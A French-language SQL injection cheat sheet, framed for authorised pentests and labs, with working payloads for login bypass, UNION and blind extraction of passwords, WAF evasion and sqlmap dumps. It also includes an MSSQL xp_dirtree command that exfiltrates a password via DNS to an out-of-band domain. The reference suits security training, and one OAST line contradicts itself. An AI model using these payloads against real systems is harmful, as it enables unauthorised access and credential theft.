# Injection SQL (SQLi) — Cheat Sheet

## 1. Périmètre et conventions

Cette fiche couvre la détection et l'exploitation des injections SQL, organisées selon le canal disponible pour observer l'effet de l'injection, puis selon l'objectif d'exploitation.

**Familles de techniques couvertes :**

- **In-Band / Error-Based** : erreur SQL visible dans la réponse ; exfiltration directe via message d'erreur.
- **Inline** : évaluation d'expressions arithmétiques, paramètre numérique sans guillemets.
- **Boolean-Based Blind** : différence de contenu selon une condition vraie/fausse.
- **Conditional Error Blind** : différence de code HTTP (200/500) selon une condition.
- **Time-Based Blind** : différence de délai de réponse selon une condition.
- **UNION-Based** : exfiltration directe par ajout d'un `SELECT` à la requête légitime.
- **Out-of-Band / OAST** : exfiltration via requête DNS sortante du SGBD.
- **Second-Order** : injection stockée, exécutée dans une autre fonctionnalité.

**Outil de référence :** Burp Suite (Repeater, Intruder), `sqlmap`, Burp Collaborator.

**Contexte applicatif des exemples :** application e-commerce fictive avec `GET /produit?id=1` (requête `SELECT nom, prix, description FROM produits WHERE id = '1'`) et `POST /login` (champs `username` / `password`), et table `users(id, username, password, is_admin)`.

**Conditions générales :** techniques applicables sur des labs, CTF ou pentests autorisés. Ne jamais tester `OR 1=1` sur un `DELETE`/`UPDATE` en production.

**Conventions :**

| Placeholder | Signification |
|---|---|
| `cible.exemple` | Nom d'hôte fictif, à remplacer par la cible réelle autorisée |
| `xyz` | Valeur légitime d'un cookie/paramètre — à remplacer par la valeur réelle observée |
| `a1b2c3.oastify.com` | Domaine OOB contrôlé par l'auditeur (Burp Collaborator / `interactsh`) |

---

## 2. Tableau de repérage rapide

| Objectif | Technique | Quand l'utiliser | Signal attendu | Limite principale |
|---|---|---|---|---|
| Détecter une SQLi (chaîne) | Apostrophe `'` | Premier test sur tout paramètre texte | Erreur SQL, 500, page blanche | Paramètre numérique : l'apostrophe peut ne rien casser |
| Détecter une SQLi (numérique) | `2-1` puis `1+1` | Paramètre numérique sans guillemets | Résultat correspondant à `1` puis à `2` | Sans effet si l'appli caste l'entrée en entier avant la requête |
| Confirmer le contrôle syntaxique | `1''` (double apostrophe) | Après erreur sur `'` | Page redevient normale | — |
| Confirmer une injection Boolean | Paire vrai/faux : `OR '1'='1` vs `AND '1'='2` | Pas d'erreur visible mais contenu variable | Résultats différents entre les deux formes | Faux positif possible si l'appli varie pour d'autres raisons |
| Contourner une authentification | `administrator'--` dans `username` | Login injectable | Connexion réussie sans mot de passe | Nécessite de connaître un nom de compte valide |
| Compter les colonnes (UNION) | `ORDER BY N` incrémental | Avant toute attaque UNION | Erreur à `ORDER BY N+1` | — |
| Identifier les colonnes texte | `UNION SELECT NULL,'a',NULL--` | Après avoir compté les colonnes | `'a'` visible dans la réponse | Chaque colonne doit être testée séparément |
| Exfiltrer via UNION | `UNION SELECT NULL, username, password FROM users--` | Colonne texte identifiée | Données dans la réponse HTML | La page doit réfléchir le résultat du SELECT |
| Fingerprinter le SGBD | `@@version`, `version()`, `v$version` | Avant toute exploitation avancée | Chaîne de version dans la réponse | Syntaxe propre à chaque SGBD |
| Lister les tables | `UNION SELECT NULL,table_name,NULL FROM information_schema.tables` | SGBD identifié, UNION disponible | Noms des tables dans la réponse | Oracle : utiliser `all_tables` |
| Extraire char par char (Boolean) | `SUBSTRING(password,N,1)='a'` | Blind boolean confirmé | Comportement différent selon le caractère | Jusqu'à `longueur × alphabet` requêtes |
| Extraire char par char (Time) | `IF(SUBSTRING(...)='a', SLEEP(5), 0)` | Aucun autre canal disponible | Délai ~5 s si vrai, délai normal si faux | Lent, bruyant, sensible au jitter réseau |
| Exfiltrer sans réponse (OAST) | `xp_dirtree '//` + données + domaine OOB | Traitement asynchrone, tous canaux muets | Requête DNS entrante sur le serveur OOB | SGBD doit avoir accès réseau sortant |
| Bypass WAF | Encodage XML (`&#x53;ELECT`) / Unicode JSON | WAF bloquant les mots-clés SQL en clair | Réponse SQL (pas 403) sur la version encodée | L'appli doit décoder après le WAF |

---

## 3. Techniques classées par objectif

### 3.1 Détecter

#### Rupture syntaxique — apostrophe (chaînes)

**Objectif :** confirmer qu'une entrée texte est concaténée sans échappement dans une requête SQL.

**Quand l'utiliser :** tout paramètre texte de l'application, y compris les en-têtes journalisés (`User-Agent`, `Referer`, `X-Forwarded-For`).

**Syntaxe minimale :**

```http
GET /produit?id=1' HTTP/1.1
Host: cible.exemple
```

**Signal attendu :** erreur SQL brute (`You have an error in your SQL syntax...` MySQL, `Unclosed quotation mark...` MSSQL), HTTP 500, ou page vide/tronquée.

**Confirmation par double apostrophe :**

```http
GET /produit?id=1'' HTTP/1.1
```

Si la page redevient normale, le comportement est bien lié à la syntaxe SQL (l'apostrophe double forme une chaîne vide valide en SQL).

**Limites :** l'apostrophe peut être filtrée ou avoir un autre effet sur un paramètre numérique — passer alors à l'évaluation arithmétique.

**Source :** cours fourni, section 1.1.

#### Évaluation arithmétique (paramètres numériques)

**Objectif :** établir qu'un paramètre numérique est évalué comme expression SQL et non traité comme chaîne.

**Quand l'utiliser :** paramètre dont la valeur est un entier, apostrophe sans effet.

**Méthode :**

```http
# Référence : affiche le produit n°1
GET /produit?id=1 HTTP/1.1

# Si évalué par SQL → affiche toujours le produit n°1 (2-1=1)
GET /produit?id=2-1 HTTP/1.1

# Confirmation → affiche le produit n°2 (1+1=2)
GET /produit?id=1+1 HTTP/1.1
```

**Signal attendu :** résultats cohérents avec l'évaluation arithmétique (`2-1` → produit n°1 ; `1+1` → produit n°2).

**Limites :** sans effet si l'application caste l'entrée en entier `int(input)` avant de l'insérer — le paramètre ne peut alors pas contenir d'expression.

**Source :** cours fourni, section 1.2.

#### Paire Boolean (confirmation de contrôle syntaxique)

**Objectif :** prouver que l'entrée modifie la logique de la requête et non qu'elle provoque un simple bug d'affichage.

**Quand l'utiliser :** aucune erreur SQL visible, mais soupçon d'injection.

**Syntaxe minimale :**

```http
# Condition VRAIE — doit retourner plus de résultats que la normale
GET /produit?id=1' OR '1'='1 HTTP/1.1

# Condition FAUSSE — doit retourner zéro résultat
GET /produit?id=1' AND '1'='2 HTTP/1.1
```

**Signal attendu :** réponses nettement différentes et reproductibles entre les deux formes (contenu, taille, nombre d'éléments affichés).

**Interprétation :** une divergence cohérente entre vrai et faux confirme une injection Boolean-Based. Un signal isolé non reproductible ne suffit pas.

**Source :** cours fourni, sections 1.3 et 1.4.

#### Injection dans les en-têtes HTTP

**Objectif :** identifier des points d'injection dans des en-têtes journalisés en base plutôt que dans des paramètres visibles.

**Quand l'utiliser :** formulaire principal semble protégé ; application journalisant les accès en base.

**Syntaxe minimale :**

```http
POST /login HTTP/1.1
Host: cible.exemple
User-Agent: ' OR 1=1-- 

username=test&password=test
```

**En-têtes à tester systématiquement :** `User-Agent`, `Referer`, `X-Forwarded-For`.

**Signal attendu :** même différentiel qu'un paramètre classique (erreur, contenu, délai) sur la fonctionnalité qui journalise l'en-tête.

**Source :** cours fourni, section 2.3.

---

### 3.2 Confirmer par fingerprinting

**Objectif :** identifier le SGBD avant toute exploitation avancée (syntaxe des délais, tables système, concaténation, etc.).

**Syntaxes différenciantes :**

```http
# MySQL / MSSQL : acceptent @@version
GET /produit?id=1' AND @@version IS NOT NULL-- HTTP/1.1

# PostgreSQL / MySQL : version() comme fonction
GET /produit?id=1' UNION SELECT NULL,version(),NULL-- HTTP/1.1

# Oracle uniquement : v$version
GET /produit?id=1' UNION SELECT NULL,banner,NULL FROM v$version-- HTTP/1.1
```

**Tableau de référence rapide :**

| Critère | MySQL/MariaDB | PostgreSQL | SQL Server | Oracle |
|---|---|---|---|---|
| Commentaire | `#` ou `-- ` (espace requis) | `--` | `--` | `--` |
| Version | `version()` | `version()` | `@@version` | `v$version` |
| Concaténation | `CONCAT(a,b)` | `a\|\|b` | `a+b` | `a\|\|b` |
| Tables système | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `all_tables` |
| Colonnes système | `information_schema.columns` | `information_schema.columns` | `information_schema.columns` | `all_tab_columns` |
| Délai conditionnel | `IF(cond, SLEEP(5), 0)` | `CASE WHEN cond THEN pg_sleep(5) END` | `IF(cond) WAITFOR DELAY '0:0:5'` | `CASE WHEN cond THEN dbms_pipe.receive_message(('a'),5) END` |
| `FROM` obligatoire | Non | Non | Non | Oui (`FROM DUAL`) |
| Noms objets | minuscules | minuscules | insensible casse | **MAJUSCULES** |

**Source :** cours fourni, section 5.1.

---

### 3.3 Exploiter — Neutralisation de filtre et tautologie

**Objectif :** supprimer une condition de filtrage (`is_visible = 1`, `AND password = '...'`) en commentant le reste de la requête.

**Syntaxe minimale (commentaire) :**

```http
GET /produits?categorie=Gifts'-- HTTP/1.1
```

```sql
-- Avant : WHERE category = 'Gifts' AND is_visible = 1
-- Après  : WHERE category = 'Gifts'-- ' AND is_visible = 1   [commenté]
```

**Variante — tautologie pour tout retourner :**

```http
GET /produits?categorie=Gifts' OR 1=1-- HTTP/1.1
```

**Signal attendu :** tous les enregistrements de la table retournés, y compris ceux que le filtre écartait.

**Limites :** ne jamais tester la variante `OR 1=1` sur un endpoint `DELETE`/`UPDATE` — serait catastrophique en production.

**Source :** cours fourni, section 3.1.

---

### 3.4 Exploiter — Bypass d'authentification

**Objectif :** contourner un formulaire de login sans connaître de mot de passe valide.

**Prérequis :** connaître ou deviner un nom de compte (ex. `administrator`).

**Syntaxe minimale (username connu) :**

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=administrator'--&password=nimportequoi
```

```sql
-- Résultat : WHERE username = 'administrator'--' AND password = '...'
-- Le mot de passe n'est plus jamais évalué
```

**Variante sans nom de compte connu :**

```text
username=' OR 1=1 LIMIT 1--&password=x
```

```sql
-- Résultat : WHERE username = '' OR 1=1 LIMIT 1--' AND password = 'x'
-- LIMIT 1 force la sélection du premier compte (souvent l'admin, ID le plus bas)
-- MSSQL/Oracle : remplacer LIMIT 1 par TOP 1 / ROWNUM=1 si nécessaire
```

**Note MySQL :** un espace est requis après `--` pour que ce soit reconnu comme commentaire (`administrator'-- ` avec espace final). Alternative : `administrator'#` (spécifique MySQL, pas d'espace requis).

**Signal attendu :** connexion réussie, redirection vers espace authentifié.

**Source :** cours fourni, section 3.2.

---

### 3.5 Exploiter — UNION-Based (exfiltration directe)

> **Prérequis :** la page doit refléter le résultat du `SELECT` dans son HTML. Deux conditions : même nombre de colonnes que la requête légitime, types compatibles.

#### Étape 1 — Compter les colonnes (`ORDER BY`)

```http
GET /produit?id=1' ORDER BY 1-- HTTP/1.1   → 200 OK
GET /produit?id=1' ORDER BY 2-- HTTP/1.1   → 200 OK
GET /produit?id=1' ORDER BY 3-- HTTP/1.1   → 200 OK
GET /produit?id=1' ORDER BY 4-- HTTP/1.1   → 500 Error
```

L'erreur à `ORDER BY 4` indique **3 colonnes** dans la requête d'origine.

#### Étape 2 — Identifier les colonnes acceptant du texte

```sql
' UNION SELECT NULL,NULL,NULL--          -- Valider le nombre de colonnes (200 attendu)
' UNION SELECT 'a',NULL,NULL--           -- Tester colonne 1
' UNION SELECT NULL,'a',NULL--           -- Tester colonne 2 (si 'a' apparaît → colonne 2 = texte)
' UNION SELECT NULL,NULL,'a'--           -- Tester colonne 3
```

**Oracle uniquement** — ajouter `FROM DUAL` :

```sql
' UNION SELECT NULL,NULL,NULL FROM DUAL--
```

#### Étape 3 — Exfiltrer des données

```http
GET /produit?id=1' UNION SELECT NULL, username, password FROM users-- HTTP/1.1
```

**Variante mono-colonne (une seule colonne texte disponible) :**

```sql
-- Oracle / PostgreSQL
' UNION SELECT NULL, username || ':' || password, NULL FROM users--

-- MySQL
' UNION SELECT NULL, CONCAT(username,':',password), NULL FROM users--
```

**Signal attendu :** une ligne par enregistrement de la table cible, affichée dans les emplacements des colonnes identifiées à l'étape 2.

**Source :** cours fourni, section 3.3.

---

### 3.6 Exploiter — Énumération du schéma

**Objectif :** découvrir la structure de la base (tables, colonnes) quand elle est inconnue.

**Lister les tables (MySQL / PostgreSQL / MSSQL) :**

```http
GET /produit?id=1' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- HTTP/1.1
```

**Lister les colonnes d'une table identifiée :**

```http
GET /produit?id=1' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users'-- HTTP/1.1
```

**Oracle (vues propres, noms en MAJUSCULES) :**

```sql
' UNION SELECT NULL, table_name, NULL FROM all_tables--
' UNION SELECT NULL, column_name, NULL FROM all_tab_columns WHERE table_name='USERS'--
```

**Source :** cours fourni, section 5.2.

---

### 3.7 Exploiter — Boolean-Based Blind (extraction char par char)

**Objectif :** extraire la valeur d'un champ en testant chaque caractère via une condition binaire.

**Quand l'utiliser :** aucune erreur ni donnée visible dans la réponse, mais le contenu ou comportement varie selon la vérité d'une condition injectée.

**Prérequis :** signal binaire stable (ex. message `"Bienvenue"` présent/absent, contenu de longueur différente).

**Étape 1 — Déterminer la longueur du champ cible :**

```sql
xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20--
```

Incrémenter jusqu'à obtenir le signal « vrai ».

**Étape 2 — Extraire caractère par caractère :**

```sql
-- Position 1 : le 1er caractère est-il 'a' ?
xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--
```

Itérer sur la position (`1,1` → `2,1` → `3,1`…) et sur le caractère (`'a'` → `'b'`…) jusqu'à reconstruction complète.

**Optimisation — recherche dichotomique sur le code ASCII (réduit à ~7 requêtes/caractère) :**

```sql
xyz' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)) > 109--
```

**Automatisation :**

```bash
sqlmap -u "https://cible.exemple/home" --cookie="TrackingId=xyz" -p TrackingId --level=2 --dump
```

**Source :** cours fourni, section 4.1.

---

### 3.8 Exploiter — Conditional Error Blind (500 vs 200)

**Objectif :** extraire des données quand seul le code HTTP varie (200/500) sans aucune différence de contenu.

**Quand l'utiliser :** pas de signal booléen visible dans le contenu, mais le code HTTP varie selon qu'une exception SQL est déclenchée ou non.

**Syntaxe de référence (CASE + division par zéro) :**

```sql
-- Validation (condition statique)
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a   → 500 (1=1 vrai → 1/0 crash)
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a   → 200 (1=2 faux → 'a', pas de crash)

-- Extraction réelle : position 1, caractère 'a' ?
xyz' AND (SELECT CASE
            WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1) = 'a')
            THEN 1/0 ELSE 'a' END)='a
```

- HTTP 500 → caractère trouvé, passer à la position suivante.
- HTTP 200 → tester le caractère suivant à la même position.

**Source :** cours fourni, section 4.2.

---

### 3.9 Exploiter — Error-Based (exfiltration en une requête)

**Objectif :** faire apparaître une valeur directement dans le message d'erreur SQL affiché par l'application.

**Quand l'utiliser :** l'application affiche le message d'erreur SQL brut (configuration de debug active).

**Syntaxe minimale (CAST — MSSQL / PostgreSQL) :**

```http
GET /produit?id=1' AND CAST((SELECT password FROM users WHERE username='administrator') AS int)=1-- HTTP/1.1
```

**Réponse attendue :**

```text
Conversion failed when converting the varchar value 'S3cr3tP@ss' to data type int.
```

Le mot de passe apparaît en clair dans le message d'erreur — une seule requête suffit.

**Limites :** entièrement dépendant de l'affichage des erreurs SQL brutes côté client — sans effet si les erreurs sont masquées.

**Source :** cours fourni, section 4.3.

---

### 3.10 Exploiter — Time-Based Blind (extraction par délai)

**Objectif :** extraire des données quand aucun autre canal (contenu, code HTTP) n'est exploitable.

**Quand l'utiliser :** dernier recours après échec de toutes les techniques précédentes.

**Validation du vecteur :**

```http
# MySQL
GET /produit?id=1' AND SLEEP(5)-- HTTP/1.1        → ~5 s si injectable
GET /produit?id=1' AND IF(1=2,SLEEP(5),0)-- HTTP/1.1  → immédiat (condition fausse)
```

**Extraction conditionnelle (position 1, caractère 'a') :**

```sql
-- MySQL / MariaDB
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--

-- SQL Server
'; IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a') WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT CASE WHEN ((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a')
    THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Oracle
'; SELECT CASE WHEN ((SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a')
    THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual--
```

- Réponse en ~5 s → caractère correct → passer à la position suivante.
- Réponse immédiate → tester le caractère suivant.

**Limites :** très lent (potentiellement des heures), bruyant (charge anormale détectable), sensible au jitter réseau — toujours mesurer une baseline avant de conclure.

**Source :** cours fourni, sections 1.4 et 4.4.

---

### 3.11 Exploiter — Out-of-Band / OAST (DNS)

**Objectif :** confirmer l'exécution d'un payload sur un traitement asynchrone, ou exfiltrer des données via une requête DNS émise par le SGBD lui-même.

**Quand l'utiliser :** traitement en arrière-plan (batch, worker), tous les canaux de réponse (contenu, statut, délai) sont exploitables.

**Confirmation d'exécution (MSSQL — `xp_dirtree`) :**

```sql
'; exec master..xp_dirtree '\\a1b2c3.oastify.com\partage'--
```

**Oracle (équivalent) :**

```sql
SELECT UTL_INADDR.get_host_address('a1b2c3.oastify.com') FROM dual;
```

**Exfiltration de données via le sous-domaine DNS (MSSQL) :**

```sql
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.a1b2c3.burpcollaborator.net/a"')--
```

**Signal attendu :**

```text
Requête DNS entrante sur le serveur OOB :
S3cr3tP@ss.a1b2c3.burpcollaborator.net
```

Le sous-domaine interrogé **est** la donnée exfiltrée — extraction en une seule requête.

**Limites :** nécessite que le SGBD dispose d'un accès réseau sortant (souvent restreint en environnement durci) et des fonctions système nécessaires.

**Source :** cours fourni, sections 1.5 et 4.5.

---

### 3.12 Détecter — Second-Order SQLi

**Objectif :** identifier une injection dont le point de stockage (phase 1) et le point d'exécution (phase 2) sont dans des fonctionnalités distinctes.

**Quand l'utiliser :** audit de fonctionnalités utilisant des données déjà stockées (changement de mot de passe, mise à jour de profil, génération de rapports).

**Phase 1 — Stockage passif :**

```http
POST /account/settings HTTP/1.1
Content-Type: application/x-www-form-urlencoded

display_name=administrator'--
```

Aucun signal immédiat — la valeur est stockée via une requête préparée (sans exécution de l'injection).

**Phase 2 — Exécution dans une autre fonctionnalité :**

```sql
-- Job interne relisant display_name et le concaténant sans paramétrage :
UPDATE users SET password = 'hacked123' WHERE username = 'administrator'--';
--                                        ^ l'injection stockée s'exécute maintenant
```

**Difficulté de détection :** le scanner automatique teste phase 1 uniquement et ne voit aucune injection. Il faut **cartographier tous les flux de réutilisation** de données stockées dans des requêtes SQL dynamiques.

**Source :** cours fourni, section 6.

---

## 4. Payloads et syntaxes représentatifs

| Intention | Payload de référence | Contexte | Variante utile | Différence |
|---|---|---|---|---|
| Rupture syntaxique | `'` | Paramètre texte GET/POST ou en-tête | `''` (double) pour confirmer | Double apostrophe valide = confirme SQLi |
| Évaluation arithmétique | `2-1` | Paramètre numérique | `1+1` | Teste que l'expression est bien évaluée par SQL |
| Commentaire | `'--` | Fin d'une valeur de champ texte | `'#` (MySQL) | `#` ne nécessite pas d'espace après le commentaire |
| Tautologie | `' OR 1=1--` | Paramètre WHERE texte | `' OR '1'='1` | Syntaxe alternative selon le contexte de guillemets |
| Auth bypass (compte connu) | `administrator'--` | Champ username | `admin'--` | Adapter selon le nom de compte cible |
| Auth bypass (sans compte) | `' OR 1=1 LIMIT 1--` | Champ username | `' OR 1=1--` (MSSQL/Oracle) | MSSQL/Oracle n'ont pas `LIMIT`, utiliser `TOP 1` ou `ROWNUM=1` |
| UNION count | `' ORDER BY 3--` | Paramètre injectable | Incrémenter jusqu'à erreur | L'erreur indique que la N-ième colonne n'existe pas |
| UNION colonne texte | `' UNION SELECT NULL,'a',NULL--` | 3 colonnes confirmées | Déplacer `'a'` sur chaque position | Chaque position est testée séparément |
| UNION dump | `' UNION SELECT NULL,username,password FROM users--` | Colonne texte identifiée | `CONCAT(username,':',password)` si mono-colonne | Concaténation selon le SGBD |
| Boolean blind | `SUBSTRING(password,1,1)='a'` | Cookie ou paramètre avec signal binaire | `ASCII(SUBSTRING(...)) > 109` | Dichotomie ASCII = ~7 requêtes/caractère au lieu de 62 |
| Conditional error | `CASE WHEN (cond) THEN 1/0 ELSE 'a' END)='a` | Paramètre injectable, signal via code HTTP | — | Signal : 500 = vrai, 200 = faux |
| Time-based validation | `' AND SLEEP(5)--` | Tout paramètre, MySQL | `' AND IF(1=2,SLEEP(5),0)--` | IF conditionnel = test de contrôle (faux = pas de délai) |
| Time extraction | `IF(SUBSTRING(...)='a',SLEEP(5),0)` | MySQL blind | Syntaxes alternatives selon SGBD (section 3.10) | Syntaxe propre à chaque moteur |
| OAST confirmation | `'; exec master..xp_dirtree '\\OOB\a'--` | MSSQL | `UTL_INADDR.get_host_address(OOB)` (Oracle) | Mécanisme propre à chaque SGBD |
| OAST exfiltration | `exec('xp_dirtree "//' + @p + '.OOB/a"')` | MSSQL, données dans le sous-domaine | — | Extraction en une requête, sans itération |

---

## 5. Encodages, formats et représentation des entrées

### WAF Bypass par encodage

**Condition d'utilisation :** le WAF filtre les mots-clés SQL en clair (`SELECT`, `UNION`, etc.) mais l'application décode les données **après** le WAF avant d'exécuter la requête.

**Validation du bypass :**
1. Envoyer le payload en clair → confirmer le blocage (`403 Forbidden`).
2. Envoyer la version encodée → observer si la réponse est celle d'une exécution SQL (erreur, délai, contenu).

**Encodage XML (entités hexadécimales) :**

```xml
<!-- Le WAF voit "&#x53;ELECT" → laisse passer. L'appli décode en "SELECT". -->
<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
```

**Encodage Unicode JSON :**

```json
{
  "storeId": "999 \u0053ELECT * FROM information_schema.tables"
}
```

| Caractère | Entité XML hex | Séquence Unicode JSON |
|---|---|---|
| `S` | `&#x53;` | `\u0053` |
| `E` | `&#x45;` | `\u0045` |
| `L` | `&#x4c;` | `\u004c` |

**Condition d'inefficacité :** sans effet si le WAF normalise (décode) avant d'appliquer ses règles, ou si l'application ne décode pas une seconde fois.

---

## 6. Exemples de requêtes HTTP

### 6.1 Détection in-band (apostrophe)

```http
# Référence légitime
GET /produit?id=1 HTTP/1.1
Host: cible.exemple
```

```http
# Rupture syntaxique
GET /produit?id=1' HTTP/1.1
Host: cible.exemple
```

```http
# Confirmation (double apostrophe)
GET /produit?id=1'' HTTP/1.1
Host: cible.exemple
```

- **Changement clé :** apostrophe ajoutée à la valeur.
- **Signal :** erreur SQL / 500 sur l'apostrophe seule ; retour à la normale sur `''`.
- **Ce que cela ne prouve pas seul :** que l'injection est exploitable — seulement que l'entrée n'est pas échappée.

### 6.2 UNION-Based (3 colonnes, colonne 2 texte)

```http
# Étape 1 : compter les colonnes
GET /produit?id=1' ORDER BY 3-- HTTP/1.1
Host: cible.exemple
```

```http
# Étape 2 : identifier la colonne texte
GET /produit?id=1' UNION SELECT NULL,'a',NULL-- HTTP/1.1
Host: cible.exemple
```

```http
# Étape 3 : exfiltrer
GET /produit?id=1' UNION SELECT NULL,username||':'||password,NULL FROM users-- HTTP/1.1
Host: cible.exemple
```

- **Changement progressif :** chaque étape ne modifie qu'un élément du payload.
- **Ce que 'a' visible prouve :** que la colonne 2 accepte du texte et reflète son contenu dans la page.

### 6.3 Boolean-Blind (extraction via cookie)

```http
# Validation du vecteur — condition vraie
GET /home HTTP/1.1
Cookie: TrackingId=xyz' AND '1'='1
```

```http
# Validation — condition fausse
GET /home HTTP/1.1
Cookie: TrackingId=xyz' AND '1'='2
```

```http
# Extraction : longueur du mot de passe
GET /home HTTP/1.1
Cookie: TrackingId=xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20--
```

```http
# Extraction : caractère 1
GET /home HTTP/1.1
Cookie: TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--
```

- **Signal binaire :** présence/absence du message `"Bienvenue"` selon la condition.
- **Ce que cela ne prouve pas seul :** un seul test vrai n'écarte pas un faux positif ; toujours tester aussi la condition fausse.

---

## 7. Outils et commandes

| Outil | Fonction | Quand l'utiliser | Exemple minimal | Limite ou précaution |
|---|---|---|---|---|
| Burp Repeater | Modification manuelle et renvoi de requêtes | Détection initiale, UNION step by step, confirmation de bypass WAF | Modifier le paramètre cible, observer la réponse | Pas adapté à l'extraction automatisée caractère par caractère |
| Burp Intruder — Sniper | Automatisation d'une position variable | Recherche de colonne texte (UNION), test de longueur de champ | Positionner sur le caractère/valeur testé, charger l'alphabet | Mode Cluster Bomb pour combiner position × caractère |
| Burp Intruder — Cluster Bomb | Deux positions variables (position × caractère) | Extraction Boolean-Blind automatisée | Position 1 : `1..20` ; Position 2 : `a..z0..9` | Très bruyant ; beaucoup de requêtes |
| Burp Collaborator | Serveur DNS/HTTP OOB | Détection OAST, exfiltration DNS | Générer un sous-domaine, l'insérer dans `xp_dirtree` | Nécessite Burp Pro ; sorties réseau depuis le SGBD requises |
| `sqlmap` | Automatisation complète (détection → exfiltration) | Après confirmation manuelle de la vulnérabilité | `sqlmap -u "https://cible.exemple/?id=1" -p id --dump` | Bruyant, peut saturer les logs ou déclencher un blocage WAF ; toujours tester manuellement d'abord |

---

## 8. Signaux caractéristiques et vérifications

| Observation | Ce qu'elle peut indiquer | Vérification complémentaire | Conclusion à éviter |
|---|---|---|---|
| HTTP 500 + message d'erreur SQL brut | SQLi In-Band confirmée | Tester `1''` (double apostrophe) pour écarter un bug non lié à SQL | Que toutes les techniques sont disponibles — erreur visible ≠ UNION exploitable automatiquement |
| HTTP 200 mais page vide ou tronquée | Injection possible, erreur masquée | Tester la paire vraie/fausse pour confirmer un Boolean-Blind | Qu'une page vide est toujours liée à une injection — peut être un autre bug |
| Contenu différent entre `OR '1'='1` et `AND '1'='2` | Boolean-Based Blind confirmée | Reproduire 3 fois chaque forme pour écarter le non-déterminisme | Qu'une divergence isolée suffit — la différence doit être cohérente et reproductible |
| `'a'` visible dans la page après `UNION SELECT NULL,'a',NULL--` | Colonne 2 accepte du texte, page réfléchit le résultat | Tester la même chose sur les autres colonnes pour trouver toutes les colonnes exploitables | Que toutes les colonnes réfléchissent — tester colonne par colonne |
| Délai de ~5 s reproductible et proportionnel à `SLEEP(N)` | Time-Based Blind confirmée | Varier N (`SLEEP(5)` vs `SLEEP(10)`) et mesurer la proportionnalité | Qu'un seul délai isolé confirme l'injection — toujours mesurer une baseline |
| Requête DNS entrante sur le serveur OOB | OAST confirmée, payload exécuté côté SGBD | Vérifier que l'IP source est celle du SGBD cible et non du navigateur de l'auditeur | Qu'une requête DNS non corrélée temporellement constitue une preuve |
| Message d'erreur de conversion de type contenant une valeur de la base | Error-Based confirmée | Reproduire avec un autre nom d'utilisateur ou champ pour évaluer la portée | Que cette technique fonctionne sans affichage d'erreurs brutes — elle en dépend entièrement |

---

## 9. Arbre de décision — Choisir la technique selon le contexte

```text
1. Envoyer '  →  erreur SQL brute visible ?
   ├── OUI → In-Band confirmé
   │         ├── Erreur brute affichée ?  → Error-Based (CAST) [section 3.9]
   │         └── UNION disponible (SELECT reflété) ?  → UNION-Based [section 3.5]
   └── NON → Masqué — tester la paire vraie/fausse

2. Contenu différent entre condition vraie et condition fausse ?
   ├── OUI → Boolean-Based Blind [section 3.7]
   └── NON → Code HTTP différent selon exception SQL (CASE/1/0) ?
              ├── OUI → Conditional Error Blind [section 3.8]
              └── NON → Délai proportionnel à SLEEP(N) reproductible ?
                         ├── OUI → Time-Based Blind [section 3.10]
                         └── NON → Requête DNS sortante reçue sur OOB ?
                                    ├── OUI → OAST [section 3.11]
                                    └── NON → Signal exploitable introuvable
                                              (considérer WAF bypass [section 5] ou second-order [section 3.12])

Règle à chaque étape : toujours valider avec un couple vrai/faux avant de conclure.
Un test négatif à une étape ne prouve pas l'absence de vulnérabilité.
```

---

## 10. Diagnostic rapide des erreurs

| Problème constaté | Causes possibles | Vérification à effectuer | Ajustement pertinent | Ce que cela permet de conclure |
|---|---|---|---|---|
| Apostrophe sans effet (pas d'erreur) | Paramètre numérique casté avant insertion ; apostrophe filtrée | Tester `2-1` puis `1+1` pour l'évaluation arithmétique | Passer à l'injection numérique sans guillemets | Que l'apostrophe seule n'est pas le seul vecteur de détection |
| UNION renvoie une erreur malgré un bon nombre de colonnes | Types incompatibles entre les colonnes des deux SELECT | Substituer `NULL` un par un par `'a'`, `1` ou une chaîne adaptée au type | Utiliser `NULL` pour les colonnes non exploitées, ne varier qu'une position à la fois | Que l'erreur de type est distincte d'une erreur de nombre de colonnes |
| UNION réussit (200) mais 'a' n'apparaît pas dans la page | La page ne reflète pas toutes les colonnes (certaines sont ignorées) | Tester chaque position séparément | Identifier quelle(s) colonne(s) sont effectivement affichées dans le HTML | Que l'injection UNION est active même sans visibilité directe de toutes les colonnes |
| Boolean-Blind : aucune différence entre vrai et faux | Signal binaire absent ou masqué ; or le test lui-même peut être mal formé | Vérifier la syntaxe du payload (commentaire, guillemets) ; tester un signal plus visible (`OR 1=1` vs `AND 1=2`) | Passer aux erreurs conditionnelles ou au time-based | Que l'absence de signal booléen ne ferme pas les autres canaux |
| Délai non reproductible | Bruit réseau ou charge serveur ; ou `SLEEP()` non disponible sur ce SGBD | Vérifier la syntaxe selon le SGBD (section 3.10) ; mesurer plusieurs baselines | Augmenter N ; passer à OAST si time-based n'est pas fiable | Qu'un délai unique non corrélé à N ne constitue pas une preuve |
